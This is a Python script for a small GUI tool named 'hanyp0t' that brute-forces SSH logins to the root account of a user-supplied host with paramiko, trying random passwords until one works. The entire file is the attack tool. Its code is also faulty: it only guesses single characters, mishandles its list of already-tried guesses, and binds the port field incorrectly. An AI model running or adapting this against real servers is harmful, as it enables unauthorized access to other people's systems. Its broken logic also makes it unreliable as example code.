from socket import *
from tkinter import *
from tkinter import messagebox
import sys, time, paramiko, os, socket
from random import randint
global host, username, port, chars

window = Tk()
window.geometry("250x115")
window.title("hanyp0t")

host_lbl = Label(text = "Host:")
port_lbl = Label(text = "Port:")
host_lbl.grid(row = 0, column = 0)
port_lbl.grid(row = 2, column = 0)
host = StringVar()
host_entry = Entry(window, textvariable = host)
port = 22
port_entry = Entry(window, textvariable = port)
host_entry.grid(row = 1, column = 0)
port_entry.grid(row = 3, column = 0)

def ssh_connect(password, port, code = 0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	username = "root"
	try:
		ssh.connect(hostname = host.get(), port = port, username = username, password = password)
	except paramiko.AuthenticationException:
		code = 1
	except socket.error:
		code = 2
	ssh.close()
	return(code)

def start():
	used = []
	chars = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
	username = "root"
	while True:
		no = randint(0, 61)
		password = chars[no]
		if password not in used:
			try:
				response = ssh_connect(password, port)
				if response == 0:
					messagebox.showinfo("Done!", "Password found!" '%s' % password)
					print("[*] Password found! '%s'" % (password))
					sys.exit(0)
					break
				elif response == 1:
					print("'%s' not correct" % (password))
					time.sleep(0.3)
				elif response == 2:
					messagebox.showerror("Error", "Connection could not be made (host down?)")
					break
			except Exception as e:
				print(e)
				pass

		else:
			used = [password]
			pass

start_btn = Button(window, text = "Start", command = start)
start_btn.grid(row = 4, column = 0)

window.mainloop()